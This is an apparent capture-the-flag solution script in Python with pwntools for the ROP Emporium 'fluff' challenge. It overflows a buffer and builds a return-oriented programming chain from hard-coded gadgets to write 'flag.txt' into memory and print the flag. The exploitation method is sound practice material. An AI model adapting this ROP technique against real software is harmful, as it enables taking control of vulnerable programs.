from pwn import *

data_addr = 0x601028
gad_data_addr = p64(data_addr)

gad_write_rbx = p64(0x40062a)

gad_xlatb = p64(0x400628)

gad_stosb = p64(0x400639)

gad_pop_rdi = p64(0x4006a3)
gad_plt_print_file = p64(0x400510)

elf = ELF('fluff')

pay= b'X' * 40

write_string = b'flag.txt'
#  write_string = b'f'

#  current_al = b'\x0b'
current_al = 0x0b

# TODO more detail todo this
def elf_addr(c):
    return read('fluff').find(c) + elf.address 

def rop_got_rbx(v):
    p=b''
    p += gad_write_rbx
    p += p64(0x4000) # length = 0x40= 64bit, index=0x00=0
    p += p64(v-0x3ef2)
    return p



def rop_got_al(c):
    p=b''
    # prepare rbx
    #  rbx = elf_addr(c) - int.from_bytes(current_al, "big")
    rbx = elf_addr(c) - current_al
    p += rop_got_rbx(rbx)

    # write to al
    p += gad_xlatb
    return p

def rop_write_al_to_mem(addr):
    p=b''
    p += (gad_pop_rdi + p64(addr))
    p += gad_stosb
    return p


for i, c in enumerate(write_string):
    # prepare the al
    pay += rop_got_al(c)
    current_al = c
    # write al to mem
    pay += rop_write_al_to_mem(data_addr+i)

pay += gad_pop_rdi
pay += gad_data_addr

pay += gad_plt_print_file

sys.stdout.buffer.write(pay)
f = open("test.sc", "wb")
f.write(pay)


p = process(elf.path)
p.sendline(pay)
response = p.recvall()

print(response.decode())

flag = re.findall("ROPE{.*?}", response.decode())

if flag:
    #  print(flag[0])
    print("[-] Get flag!")
    success(flag[0])


